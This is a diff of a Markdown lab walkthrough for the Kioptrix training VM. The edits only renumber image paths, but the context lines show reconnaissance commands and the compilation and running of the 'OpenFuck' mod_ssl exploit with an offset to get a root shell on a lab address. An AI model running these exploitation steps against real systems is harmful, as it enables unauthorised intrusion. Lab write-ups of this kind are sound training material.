@@ -70,7 +70,7 @@ sudo netdiscover -r 192.168.1.0/24   # or: sudo arp-scan -l
 ping -c 4 192.168.1.106           # connectivity check
 ```
 
-![netdiscover — locating the target on the local network](../../07.%20Kioptrix/images/01-netdiscover.png)
+![netdiscover — locating the target on the local network](../../08.%20Kioptrix/images/01-netdiscover.png)
 
 *Figure 1 — `netdiscover` locates the target at `192.168.1.106`. The first three bytes of the MAC address (the OUI) reveal the hypervisor, e.g. `00:0c:29` / `00:50:56` for VMware and `08:00:27` for VirtualBox.*
 
@@ -90,7 +90,7 @@ sudo nmap -sV -A -T4 192.168.1.106
 * **`-A`** — Aggressive mode: OS detection, version detection, default NSE scripts, and traceroute.
 * **`-T4`** — aggressive timing, appropriate for a stable local lab.
 
-![Nmap scan results showing the open ports](../../07.%20Kioptrix/images/02-nmap.png)
+![Nmap scan results showing the open ports](../../08.%20Kioptrix/images/02-nmap.png)
 
 *Figure 2 — Nmap: ports 22 (ssh), 80 (http), 111 (rpcbind), 139 (samba), 443 (ssl/https), and 32768 (status) are open.*
 
@@ -117,7 +117,7 @@ With ports 139/111 open, it is worth enumerating Samba. `enum4linux` attempts a 
 enum4linux -a 192.168.1.106
 ```
 
-![enum4linux — null session against Samba](../../07.%20Kioptrix/images/03-enum4linux.png)
+![enum4linux — null session against Samba](../../08.%20Kioptrix/images/03-enum4linux.png)
 
 *Figure 3 — The server permits a session with empty credentials (null session), but **the Samba version is not disclosed** in the banner.*
 
@@ -143,7 +143,7 @@ dirb http://192.168.1.106/                   # content discovery
 nikto -h http://192.168.1.106                # known web vulnerabilities
 ```
 
-![dirb — directory discovery on the web server](../../07.%20Kioptrix/images/04-dirb.png)
+![dirb — directory discovery on the web server](../../08.%20Kioptrix/images/04-dirb.png)
 
 *Figure 4 — `dirb` returns only the standard `cgi-bin/`, `manual/`, `mrtg/`, and `usage/` directories of a default Apache installation.*
 
@@ -161,7 +161,7 @@ searchsploit apache 1.3.20        # → mostly directory traversal (rabbit hole)
 searchsploit mod_ssl 2.8          # → the one we want
 ```
 
-![searchsploit — locating the mod_ssl exploit](../../07.%20Kioptrix/images/05-searchsploit.png)
+![searchsploit — locating the mod_ssl exploit](../../08.%20Kioptrix/images/05-searchsploit.png)
 
 *Figure 5 — `mod_ssl < 2.8.7 OpenSSL Remote Buffer Overflow` (known as "OpenFuck" / "OpenFuckV2"), path `unix/remote/764.c`.*
 
@@ -209,7 +209,7 @@ We open the file (`nano 764.c`) and make three changes:
 gcc -o OpenFuck 764.c -lcrypto
 ```
 
-![gcc — installing libssl-dev and successful compilation](../../07.%20Kioptrix/images/06-compile.png)
+![gcc — installing libssl-dev and successful compilation](../../08.%20Kioptrix/images/06-compile.png)
 
 *Figure 6 — Compilation completes. Warnings such as `incompatible pointer type` are **expected** (legacy code) and do not prevent the `OpenFuck` executable from being produced.*
 
@@ -225,7 +225,7 @@ Running the executable without arguments displays the table of **supported offse
 ./OpenFuck
 ```
 
-![OpenFuck — table of supported offsets](../../07.%20Kioptrix/images/07-offsets.png)
+![OpenFuck — table of supported offsets](../../08.%20Kioptrix/images/07-offsets.png)
 
 *Figure 7 — We look for the `RedHat Linux 7.2 (apache-1.3.20)` entry. In practice, offset **`0x6b`** works (the second variant; `0x6a` frequently fails).*
 
@@ -237,7 +237,7 @@ The syntax is `./OpenFuck <offset> <target> [-c <connections>]`. The `-c` option
 ./OpenFuck 0x6b 192.168.1.106 -c 50
 ```
 
-![OpenFuck — successful exploitation and root shell](../../07.%20Kioptrix/images/08-root.png)
+![OpenFuck — successful exploitation and root shell](../../08.%20Kioptrix/images/08-root.png)
 
 *Figure 8 — After the SSL connection is established and the shellcode is sent, the second stage (`ptrace-kmod`) is compiled on the target and we obtain a **root shell**: `uid=0(root)`.*
 
